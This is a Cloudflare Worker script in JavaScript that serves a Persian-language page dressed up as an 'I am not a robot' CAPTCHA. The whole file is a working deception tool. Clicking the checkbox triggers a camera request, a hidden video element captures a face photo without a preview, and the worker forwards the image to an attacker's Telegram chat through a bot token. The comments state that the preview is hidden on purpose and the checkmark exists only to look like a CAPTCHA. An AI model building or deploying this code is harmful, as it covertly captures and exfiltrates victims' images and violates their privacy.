export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (request.method === "GET" && url.pathname === "/") {
      return new Response(getHTML(), {
        headers: { "Content-Type": "text/html;charset=UTF-8" },
      });
    }

    if (request.method === "POST" && url.pathname === "/upload") {
      try {
        const formData = await request.formData();
        const photo = formData.get("photo");

        if (!photo || !(photo instanceof File)) {
          return new Response("No photo uploaded", { status: 400 });
        }

        const telegramForm = new FormData();
        telegramForm.append("chat_id", env.TELEGRAM_CHAT_ID);
        telegramForm.append("photo", photo, "selfie.jpg");
        telegramForm.append("caption", "سلفی از وب‌سایت");

        const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const tgResponse = await fetch(telegramUrl, {
          method: "POST",
          body: telegramForm,
        });
        const tgResult = await tgResponse.json();

        if (!tgResult.ok) {
          return new Response(`Telegram error: ${tgResult.description}`, { status: 502 });
        }

        return new Response("ok", { status: 200 });
      } catch (err) {
        return new Response("Internal Server Error", { status: 500 });
      }
    }

    return new Response("Not Found", { status: 404 });
  },
};

function getHTML() {
  return `
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تایید هویت</title>
  <style>
    body {
      margin: 0; height: 100vh;
      display: flex; align-items: center; justify-content: center;
      font-family: sans-serif; background: #f8f9fa;
    }
    .captcha-box {
      display: flex; align-items: center; gap: 14px;
      padding: 18px 28px;
      background: #fff; border: 1px solid #d3d3d3; border-radius: 6px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
      user-select: none;
    }
    .checkbox {
      width: 26px; height: 26px;
      border: 2px solid #888; border-radius: 4px;
      display: flex; align-items: center; justify-content: center;
      cursor: pointer; transition: all 0.2s;
      background: #fff;
    }
    .checkbox:hover { border-color: #4a90e2; }
    .checkbox.checked {
      background: #4a90e2; border-color: #4a90e2;
    }
    .checkbox.checked::after {
      content: "";
      width: 6px; height: 12px;
      border: solid white; border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
    .label { font-size: 16px; color: #333; cursor: pointer; }
    /* ویدیو مخفی است تا هیچ پیش‌نمایشی دیده نشود */
    #hiddenVideo { display: none; }
    #canvas { display: none; }
  </style>
</head>
<body>
  <div class="captcha-box">
    <div class="checkbox" id="checkbox"></div>
    <span class="label" id="label">من ربات نیستم</span>
  </div>

  <!-- عناصر مخفی برای گرفتن عکس -->
  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const checkbox = document.getElementById('checkbox');
    const label = document.getElementById('label');
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    let busy = false;

    async function handleClick() {
      if (busy) return;
      busy = true;
      label.textContent = 'لطفاً صبر کنید...';

      let stream = null;
      try {
        // ۱. درخواست دسترسی به دوربین جلو (بدون پیش‌نمایش)
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        // منتظر می‌مانیم تا ویدیو آماده شود
        await new Promise((resolve) => {
          if (video.readyState >= 2) return resolve();
          video.onloadeddata = resolve;
        });
        // یک تاخیر خیلی کوتاه برای گرفتن فریم روشن‌تر
        await new Promise(r => setTimeout(r, 400));

        // ۲. گرفتن فریم از دوربین
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.9)
        );

        // ۳. خاموش کردن دوربین بلافاصله
        stream.getTracks().forEach(t => t.stop());
        stream = null;

        if (!blob) throw new Error('capture failed');

        // ۴. ارسال به Worker
        const formData = new FormData();
        formData.append('photo', blob, 'selfie.jpg');
        const resp = await fetch('/upload', { method: 'POST', body: formData });

        if (!resp.ok) throw new Error('upload failed');

        // ۵. نمایش تیک تایید (ظاهر کپچا)
        checkbox.classList.add('checked');
        label.textContent = 'تایید شد';
      } catch (err) {
        // در صورت خطا، وضعیت را برمی‌گردانیم تا کاربر بتواند دوباره تلاش کند
        console.error(err);
        if (stream) stream.getTracks().forEach(t => t.stop());
        label.textContent = 'من ربات نیستم';
        busy = false;
        return;
      }

      busy = false;
    }

    checkbox.addEventListener('click', handleClick);
    label.addEventListener('click', handleClick);
  </script>
</body>
</html>
  `;
}